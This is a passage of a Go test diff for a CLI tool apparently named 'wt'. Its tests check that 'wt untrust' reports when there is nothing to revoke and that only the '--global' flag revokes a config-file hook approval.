+	}
+	if !strings.Contains(out, "Nothing to revoke") {
+		t.Fatalf("expected the no-record branch, got:\n%s", out)
+	}
+	if !strings.Contains(out, "[trust] rule") {
+		t.Errorf("untrust did not say a [trust] rule still covers the repo:\n%s", out)
+	}
+}
+
+func TestUntrustGlobalRevokesTheConfigFileApproval(t *testing.T) {
+	withIsolatedTrustStore(t)
+	withPolicy(t, hookPolicyPromptUntrusted)
+	withConfigFileHooks(t, "post_create", "true")
+
+	trust, err := hookSetTrust(hookSourceConfigFile)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := trustHookSet(trust); err != nil {
+		t.Fatal(err)
+	}
+
+	savedFn := repoTrustKeyFn
+	repoTrustKeyFn = func() (string, error) { return "/somewhere/.git", nil }
+	savedGlobal := untrustGlobal
+	t.Cleanup(func() { repoTrustKeyFn, untrustGlobal = savedFn, savedGlobal })
+
+	untrustGlobal = false
+	if err := runUntrust(nil); err != nil {
+		t.Fatal(err)
+	}
+	if after, err := hookSetTrust(hookSourceConfigFile); err != nil {
+		t.Fatal(err)
+	} else if !after.trusted {
+		t.Fatal("plain 'wt untrust' revoked an approval belonging to another scope")
+	}
+
+	untrustGlobal = true
+	if err := runUntrust(nil); err != nil {
+		t.Fatal(err)
+	}
+	if after, err := hookSetTrust(hookSourceConfigFile); err != nil {
+		t.Fatal(err)
+	} else if after.trusted {
+		t.Fatal("wt untrust --global did not revoke the config file's approval")
+	}
 }
